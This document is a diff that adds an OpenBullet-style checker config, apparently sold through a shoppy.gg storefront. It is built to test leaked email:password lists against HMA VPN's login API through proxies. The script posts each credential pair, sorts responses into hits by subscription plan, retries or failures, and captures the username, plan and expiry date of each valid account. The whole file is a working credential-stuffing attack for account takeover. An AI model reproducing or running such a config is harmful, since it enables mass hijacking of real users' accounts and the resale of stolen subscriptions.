@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "HMA By-IpProxeis",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T13:12:23.4958124+02:00",
+  "AdditionalInfo": "",
+  "Author": "https://shoppy.gg/@IpMarket",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://securenetconnection.com/clapi/v1.5/user/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password combination" 
+  KEYCHAIN Success OR 
+    KEY "\",\"plan\":\"12 Months\"" 
+    KEY "plan\":\"6 Months\"" 
+  KEYCHAIN Retry OR 
+    KEY "Error has occurred" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"plan\":\"\"" 
+    KEY "\",\"expires\":\"1970-01-01" 
+
+#By PARSE "<SOURCE>" LR "\"user\":\"" "\"," -> CAP "UserName" 
+
+#IpProxies PARSE "<SOURCE>" LR "\",\"plan\":\"" "\",\"" -> CAP "Plan" 
+
+#شكرا PARSE "<SOURCE>" LR "\",\"expires\":\"" "T" -> CAP "Renew" "" " By-IpProxeis" 
+
